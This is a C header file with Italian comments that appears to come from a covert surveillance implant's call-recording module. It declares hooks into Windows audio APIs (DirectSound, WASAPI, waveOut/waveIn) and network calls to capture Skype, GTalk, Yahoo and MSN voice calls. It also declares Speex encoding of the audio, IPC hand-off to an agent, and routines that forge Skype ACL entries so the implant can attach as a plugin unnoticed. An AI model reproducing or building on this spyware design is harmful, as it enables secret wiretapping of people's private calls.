#include <shlwapi.h>
#include <mmdeviceapi.h>
#include <audioclient.h>

#include <speex/speex.h>
#include "dsound.h"

#define SAMPLE_RATE_DEFAULT	48000
#define SAMPLE_RATE_SKYPE	48000
#define SAMPLE_RATE_SKYPE_W	44100
#define SAMPLE_RATE_GTALK	48000
#define SAMPLE_RATE_YMSG	48000
#define SAMPLE_RATE_YMSG_IN	96000
#define SAMPLE_RATE_MSN		16000

typedef MMRESULT (WINAPI *waveOutGetID_t) (HWAVEOUT , LPUINT);
typedef MMRESULT (WINAPI *waveInGetID_t) (HWAVEOUT , LPUINT);
typedef HRESULT (WINAPI *DirectSoundCreate_t) (LPCGUID , LPDIRECTSOUND *, DWORD);
typedef HRESULT (WINAPI *DirectSoundCaptureCreate_t) (LPCGUID , LPDIRECTSOUNDCAPTURE *, DWORD);

// Funzioni risolte nella DLL del CODEC
typedef void *(*speex_encoder_init_t)(SpeexMode *);
typedef int (*speex_encoder_ctl_t)(void *, int, void *);
typedef void (*speex_encoder_destroy_t)(void *);
typedef int (*speex_encode_t)(void *, float *, SpeexBits *);
typedef void (*speex_bits_init_t)(SpeexBits *);
typedef void (*speex_bits_reset_t)(SpeexBits *);
typedef int (*speex_bits_write_t)(SpeexBits *, char *, int);
typedef void (*speex_bits_destroy_t)(SpeexBits *);
typedef SpeexMode *(*speex_lib_get_mode_t)(int);

extern speex_encoder_init_t rel_speex_encoder_init;
extern speex_encoder_ctl_t rel_speex_encoder_ctl;
extern speex_encoder_destroy_t rel_speex_encoder_destroy;
extern speex_encode_t rel_speex_encode;
extern speex_bits_init_t rel_speex_bits_init;
extern speex_bits_reset_t rel_speex_bits_reset;
extern speex_bits_write_t rel_speex_bits_write;
extern speex_bits_destroy_t rel_speex_bits_destroy;
extern speex_lib_get_mode_t rel_speex_lib_get_mode;

typedef struct partner_struct {
	DWORD Id;
	DWORD participants;
	char *peer;
#define VOIP_SKYPE 1
#define VOIP_GTALK 2
#define VOIP_YAHOO 3
#define VOIP_MSMSG 4
#define VOIP_MOBIL 5
#define VOIP_SKWSA 6
#define VOIP_MSNWS 7
	DWORD voip_program;
#define CALL_SKYPE_OLD 1	// Abbiamo ricevuto un chunl audio NON dalle wasapi, quindi ignoriamo quelli provenienti da li'
	DWORD flags;		
	struct partner_struct *next;
} partner_entry;


typedef struct _VoiceAdditionalData {
	UINT uVersion;
		#define LOG_VOICE_VERSION 2008121901
	UINT uChannel;
	UINT uProgramType;
	UINT uSampleRate;
	UINT uIngoing;
	FILETIME start;
	FILETIME stop;
	UINT uCallerIdLen;
	UINT uCalleeIdLen;
} VoiceAdditionalData, *pVoiceAdditionalData;

#define FLAGS_INPUT 1   // Ricevuto dal microfono
#define FLAGS_OUTPUT 2  // Suonato dalla scheda audio

#define FLAGS_SKAPI_INI 4    // Messaggio delle api di Skype (inizializzazione)
#define FLAGS_SKAPI_MSG 8    // Messaggio delle api di Skype
#define FLAGS_SKAPI_WND 16   // Messaggio delle api di Skype (thread di dispatch)
#define FLAGS_SKAPI_SWD 32   // Messaggio delle api di Skype
#define FLAGS_SKAPI_ATT 64   // Messaggio di Skype: Segnala il core che deve fare l'attach per inviare messaggi

#define FLAGS_YMSG_IN  128	// Messaggio delle api di YahooMessenger
#define FLAGS_YMSG_OUT 256	// Messaggio delle api di YahooMessenger

#define FLAGS_GTALK_IN  512  // Messaggio delle api di Gtalk
#define FLAGS_GTALK_OUT 1024 // Messaggio delle api di Gtalk

#define FLAGS_MSN_IN  2048 // Messaggio delle api di Msn Live
#define FLAGS_MSN_OUT 4096 // Messaggio delle api di Msn Live

#define FLAGS_SAMPLING 8192 // Messaggio per indicare il sample rate

// Gli ultimi due bit di flag (2^30 e 2^31) sono riservati al chunk
// audio e contengoono il numero di canali utilizzato
// In questo caso i bit da 24 a 29 sono usati per identificare il tipo di 
// programma utilizzato <voip_program>

#define MAX_HASHKEY_LEN MAX_PATH*3 // Lunghezza massima chiavi di hash per skype config

#define DEFAULT_SAMPLE_SIZE (512*1024) // 512KB
#define DEFAULT_COMPRESSION 3
#define MAX_ID_LEN 250
#define CALL_DELTA 16 // Intervallo in decimi di secondo che differenzia due chiamate

#define INPUT_ELEM 0
#define OUTPUT_ELEM 1

extern CRITICAL_SECTION skype_critic_sec;
extern partner_entry *call_list_head;
extern BOOL bPM_VoipRecordStarted; // Flag che indica se il monitor e' attivo o meno
extern DWORD sample_size[2];        // Viene inizializzato solo all'inizio
extern DWORD sample_channels[2];	 // Numero di canali
extern DWORD sample_sampling[2]; // Sample rate dei due canali per skype con wasapi
extern FILETIME channel_time_start[2];		 // Time stamp di inizio chiamata
extern FILETIME channel_time_last[2];       // Time stamp dell'ultimo campione
extern BYTE *wave_array[2];	 // Buffer contenenti i PCM dei due canali
extern DWORD max_sample_size; // Dimensione oltre la quale salva un sample su file
extern DWORD compress_factor; // Fattore di compressione del codec
extern HMODULE codec_handle; // Handle alla dll del codec
extern BOOL bPM_spmcp; // Semaforo per l'uscita del thread
extern HANDLE hSkypePMThread;
BOOL IsSkypePMInstalled();

// Sono condivise anche da IM e Contacts
extern HWND skype_api_wnd;
extern HWND skype_pm_wnd;

#include <mmsystem.h>
// XXX Dovrei liberare i buffer e le strutture create
BYTE* GetDirectSoundGetCP(BYTE** DSLock, BYTE** DSUnlock, BYTE** DSGetFormat);

// XXX Dovrei liberare i buffer e le strutture create
BYTE* GetDirectSoundCaptureGetCP(BYTE** DSLock, BYTE** DSUnlock, BYTE** DSGetFormat);
typedef DWORD (WINAPI *DSLock_t)(DWORD, DWORD, DWORD, LPVOID *, LPDWORD, LPVOID *, LPDWORD, DWORD);
typedef DWORD (WINAPI *DSUnlock_t)(DWORD, LPVOID, DWORD, LPVOID, DWORD);
typedef DWORD (WINAPI *DSGetFormat_t)(DWORD, LPVOID, DWORD, LPDWORD);


///////////////////////////
//
//   Dsound::DSGetCP
//
///////////////////////////
typedef struct {
	COMMONDATA;
	DWORD prog_type;
	DWORD old_play_c;
	DWORD saved_cp;
	BYTE *buffer_address;
	DWORD buffer_tot_len;
	DSLock_t pDSLock;
	DSUnlock_t pDSUnlock;
	DSGetFormat_t pDSGetFormat;
} DSGetCPStruct;

extern DSGetCPStruct DSGetCPData;
#define THRESHOLD 0x3C0


#define LARGE_CLI_WRITE(x, y, z, k) { BYTE *wave_ptr = x; \
		                           DWORD to_write = y; \
		                           while (to_write > 0) { \
			                          if (to_write <= MAX_MSG_LEN) { \
				                         pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, wave_ptr, to_write, z, k); \
		 		                         to_write = 0; \
			                          } else { \
				                         pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, wave_ptr, MAX_MSG_LEN, z, k); \
				                         wave_ptr += MAX_MSG_LEN; \
									     to_write -= MAX_MSG_LEN; }}}

DWORD WINAPI PM_DSGetCP(DWORD class_ptr,
	DWORD* write_c,
	DWORD* play_c);
DWORD PM_DSGetCP_setup(HMServiceStruct* pData);

///////////////////////////
//
//   Dsound::DSCapGetCP
//
///////////////////////////

typedef struct {
	COMMONDATA;
	DWORD prog_type;
	DWORD old_play_c;
	DWORD saved_cp;
	BYTE *buffer_address;
	DWORD buffer_tot_len;
	DSLock_t pDSLock;
	DSUnlock_t pDSUnlock;
	DSGetFormat_t pDSGetFormat;
} DSCapGetCPStruct;

extern DSCapGetCPStruct DSCapGetCPData;

DWORD WINAPI PM_DSCapGetCP(DWORD class_ptr,
	DWORD* write_c,
	DWORD* play_c);
DWORD PM_DSCapGetCP_setup(HMServiceStruct* pData);
///////////////////////////
//
//   WASAPI
//
///////////////////////////
#define SKYPE_WASAPI_BITS 2
#define MSN_WASAPI_BITS 4
#define WASAPI_GETBUFFER 3
#define WASAPI_RELEASEBUFFER 4
BYTE* GetWASAPIRenderFunctionAddress(IMMDevice* pMMDevice, DWORD func_num, DWORD* n_channels, DWORD* sampling);
HRESULT GetWASAPIRenderFunction(BYTE** ret_ptr, DWORD func_num, DWORD* n_channels, DWORD* sampling);

typedef struct {
	COMMONDATA;
	BYTE *obj_ptr;
	BYTE *obj_ptr2;
	BYTE *audio_data;
	BYTE *audio_data2;
	BOOL active;
	BOOL active2;
} WASAPIGetBufferStruct;

extern WASAPIGetBufferStruct WASAPIGetBufferData;

HRESULT WINAPI PM_WASAPIGetBuffer(BYTE* class_ptr,
	DWORD NumFramesRequested,
	BYTE** ppData);

DWORD PM_WASAPIGetBuffer_setup(HMServiceStruct* pData);
typedef struct {
	COMMONDATA;
	DWORD prog_type;
	WASAPIGetBufferStruct *c_data;
	DWORD n_channels;
	DWORD sampling;
	DWORD sampling2;
} WASAPIReleaseBufferStruct;
extern WASAPIReleaseBufferStruct WASAPIReleaseBufferData;

HRESULT WINAPI PM_WASAPIReleaseBuffer(BYTE* class_ptr,
	DWORD NumFramesWrittem,
	DWORD Flags);

DWORD PM_WASAPIReleaseBuffer_setup(HMServiceStruct* pData);


///////////////////////////
//
//   waveOutWrite
//
///////////////////////////
typedef struct {
	COMMONDATA;
	DWORD prog_type;
	waveOutGetID_t pwaveOutGetID;
} waveOutWriteStruct;

extern waveOutWriteStruct waveOutWriteData;

DWORD WINAPI PM_waveOutWrite(HWAVEOUT ARG1,
	WAVEHDR* WaveHdr,
	DWORD ARG3);

DWORD PM_waveOutWrite_setup(HMServiceStruct* pData);
///////////////////////////
//
// waveInUnprepareHeader
//
///////////////////////////
typedef struct {
	COMMONDATA;
	DWORD prog_type;
	waveInGetID_t pwaveInGetID;
} waveInUnprepareHeaderStruct;

extern waveInUnprepareHeaderStruct waveInUnprepareHeaderData;

DWORD WINAPI PM_waveInUnprepareHeader(HWAVEOUT ARG1,
	WAVEHDR* WaveHdr,
	DWORD ARG3);

DWORD PM_waveInUnprepareHeader_setup(HMServiceStruct* pData);

///////////////////////////
//
//   SendMessageTimeOut
//
///////////////////////////
// Server per Skype
typedef struct {
	COMMONDATA;
	BOOL voip_is_sent;
	HWND voip_skapi_wnd;
	HWND voip_skapi_swd;

	BOOL im_is_sent;
	HWND im_skapi_wnd;
	HWND im_skapi_swd;

	BOOL cn_is_sent;
	HWND cn_skapi_wnd;
	HWND cn_skapi_swd;

	BOOL is_skypepm;
	BOOL is_spm_installed;
	UINT attach_msg;
} SendMessageStruct;
extern SendMessageStruct SendMessageData;

LRESULT WINAPI PM_SendMessage(HWND hWnd,
	UINT Msg,
	WPARAM wParam,
	LPARAM lParam,
	UINT fuFlags,
	UINT uTimeout,
	PDWORD_PTR lpdwResult);

DWORD PM_SendMessage_setup(HMServiceStruct* pData);

///////////////////////////
//
//   Recv e Send
//
///////////////////////////
// Server per Yahoo Messenger
typedef struct {
	COMMONDATA;
} RecvStruct;
extern RecvStruct RecvData;

int WINAPI PM_Recv(SOCKET s,
	char* buf,
	int len,
	int flags);

int WINAPI PM_Send(SOCKET s,
	char* buf,
	int len,
	int flags);
DWORD PM_Recv_setup(HMServiceStruct* pData);

///////////////////////////
//
//  WSARecv
//
///////////////////////////
// Server per Yahoo Messenger
typedef struct _WSABUF {
	ULONG len;     /* the length of the buffer */
	__field_bcount(len) CHAR FAR *buf; /* the pointer to the buffer */
} WSABUF, FAR * LPWSABUF;
typedef struct _OVERLAPPED *    LPWSAOVERLAPPED;
typedef void (WINAPI *LPWSAOVERLAPPED_COMPLETION_ROUTINE)(DWORD, DWORD, LPWSAOVERLAPPED, DWORD);
typedef struct {
	COMMONDATA;
} WSARecvStruct;
extern WSARecvStruct WSARecvData;

int FAR PASCAL PM_WSARecv(SOCKET s,
	LPWSABUF lpBuffers,
	DWORD dwBufferCount,
	LPDWORD lpNumberOfBytesRecvd,
	LPDWORD lpFlags,
	LPWSAOVERLAPPED lpOverlapped,
	LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine);

DWORD PM_WSARecv_setup(HMServiceStruct *pData);


// Inserisce un campione nell'array (i campioni arrivano gia' ordinati dalla coda IPC)
BOOL InsertList(BYTE* channel_array, BYTE* sample, DWORD sample_len, DWORD offset);

// Salva la lista come file encodato
#define SPEEX_FREE	{rel_speex_encoder_destroy(state); rel_speex_bits_destroy(&bits);}
void SaveEncode(BYTE* source, DWORD total_size, DWORD channels, pVoiceAdditionalData additional_data, DWORD additional_len);

// Salva la lista come wav
void SaveWav(BYTE* channel_array, DWORD size, DWORD channels, pVoiceAdditionalData additional_data, DWORD additional_len);

// Carica (se risce) la DLL del codec e risolve tutti i simboli utilizzati
#define RESOLVE_ERROR { FreeLibrary(hcodec); return NULL; }
HMODULE ResolveCodecSymbols(char* name);

// Ritorna l'additional data da inserire nel file
// NON e' thread safe (tanto la richiamo solo da una funzione)
#define MAX_PEER_LEN 500
pVoiceAdditionalData VoipGetAdditionalData(partner_entry* partner_list, DWORD in_out, DWORD* add_len);

// Calcola la differenza fra due FILETIME in decimi di secondo
int TimeDiff(FILETIME* elem_1, FILETIME* elem_2);
void EndCall();
// NULL termina la stringa nella coda IPC
void NullTerminatePacket(DWORD len, BYTE* msg);
// Libera la lista degli interlocutori
void FreePartnerList(partner_entry** head);
// Puo' essere richiamata solo da dentro il processo di skype (uno dei suoi setup degli hook)
BOOL IsSkypePMInstalled();
#define GENERIC_FIELD_LEN MAX_PATH*2
// Usabile solo in questo caso, perche' potrebbe tornare dei campi inesistenti
// ma tanto al fine dei nostri check poco ci interessa leggere dei campi in piu' 
// con valori NULL
char* GetXMLNodeA(char* data, char* node, char* buffer);

//// Verifica se l'ACL nel file corrisponde alla nostra
//BOOL CheckACL(char *key1, char *key2, char *key3, char *key4, char *path, char *m_key1, char *m_key2, char *m_key3, char *m_key4, char *m_path)
//{
//	if (/*!stricmp(key1, m_key1) &&*/ !stricmp(key2, m_key2) && !stricmp(key3, m_key3) && !stricmp(key4, m_key4)/* && !stricmp(path, m_path)*/)
//		return TRUE;
//	return FALSE;
//}

DWORD RapidGetFileSize(HANDLE hfile);

// Verifica se nel file di config c'e' la nostra ACL
// Se non riesce ad aprire il file, torna che l'acl c'e'. Altrimenti potrebbe scriverla piu' volte...tanto poi non riuscirebbe comunque a scriverla
BOOL IsACLPresent(WCHAR* config_path, char* m_key1, char* m_key2, char* m_key3, char* m_key4, char* m_path);
// Scriva la nostra ACL nel file di config
BOOL WriteSkypeACL(WCHAR* config_path, char* key1, char* key2, char* key3, char* key4, char* key5, char* key6, char* path, BOOL isOld);

// Torna TRUE se e' precedente alla 5.5.0.X
BOOL IsOldSkypeVersion(WCHAR* config_path);

extern BOOL SkypeACLKeyGen(char *lpUserName, char *lpFileName, char *lpOutKey1, char *lpOutKey2, char *lpOutKey3, char *lpOutKey4, char *lpOutKey5, char *lpOutKey6, char *lpOutPath, BOOL isOld);
BOOL CalculateUserHash(WCHAR* user_name, WCHAR* file_path, char* m_key1, char* m_key2, char* m_key3, char* m_key4, char* m_key5, char* m_key6, char* m_path, BOOL isOld);

// Cerca (e in caso fa calcolare) gli hash corretti relativi ad un particolare utente
BOOL FindHashKeys(WCHAR* user_name, WCHAR* file_path, char* m_key1, char* m_key2, char* m_key3, char* m_key4, char* m_key5, char* m_key6, char* m_path, BOOL isOld);

void StartSkypeAsUser(char* skype_exe_path, STARTUPINFO* si, PROCESS_INFORMATION* pi);
void SKypeNameConvert(WCHAR* path, WCHAR* user_name, DWORD size);
// Inserisce i permessi corretti per potersi attaccare a skype come plugin
void CheckSkypePluginPermissions(DWORD skype_pid, WCHAR* skype_path);
// Monitora costantemente la possibilita' di attaccarsi come API client a Skype
DWORD WINAPI MonitorSkypePM(BOOL* semaphore);
BOOL ParseMsnMsg(BYTE* msg, DWORD* pdwLen, DWORD* pdwFlags);
BOOL ParseGtalkMsg(BYTE* msg, DWORD* pdwLen, DWORD* pdwFlags);
BOOL ParseYahooMsg(BYTE* msg, DWORD* pdwLen, DWORD* pdwFlags);
BOOL ParseSkypeMsg(BYTE* msg, DWORD* pdwLen, DWORD* pdwFlags);
BOOL ParseSamplingMsg(BYTE* msg, DWORD* pdwLen, DWORD* pdwFlags);
DWORD WINAPI PM_VoipRecordDispatch(BYTE* msg, DWORD dwLen, DWORD dwFlags, FILETIME* time_nanosec);
DWORD WINAPI PM_VoipRecordStartStop(BOOL bStartFlag, BOOL bReset);
DWORD WINAPI PM_VoipRecordInit(JSONObject elem);
DWORD WINAPI PM_VoipRecordUnregister();
void PM_VoipRecordRegister();

HRESULT WINAPI PM_WASAPICaptureGetBuffer(BYTE* class_ptr,
	BYTE** ppData,
	UINT32* pNumFramesToRead,
	DWORD* pdwFlags,
	UINT64* pu64DevicePosition,
	UINT64* pu64QPCPosition);

HRESULT WINAPI PM_WASAPICaptureGetBufferMSN(BYTE* class_ptr,
	BYTE** ppData,
	UINT32* pNumFramesToRead,
	DWORD* pdwFlags,
	UINT64* pu64DevicePosition,
	UINT64* pu64QPCPosition);

DWORD PM_WASAPICaptureGetBuffer_setup(HMServiceStruct* pData);

DWORD PM_WASAPICaptureGetBufferMSN_setup(HMServiceStruct* pData);
HRESULT WINAPI PM_WASAPICaptureReleaseBuffer(BYTE* class_ptr,
	DWORD NumFramesWrittem);
HRESULT WINAPI PM_WASAPICaptureReleaseBufferMSN(BYTE* class_ptr,
	DWORD NumFramesWrittem);
HRESULT WINAPI PM_WASAPICaptureReleaseBufferMSN(BYTE* class_ptr,
	DWORD NumFramesWrittem);
DWORD PM_WASAPICaptureReleaseBuffer_setup(HMServiceStruct* pData);
DWORD PM_WASAPICaptureReleaseBufferMSN_setup(HMServiceStruct* pData);
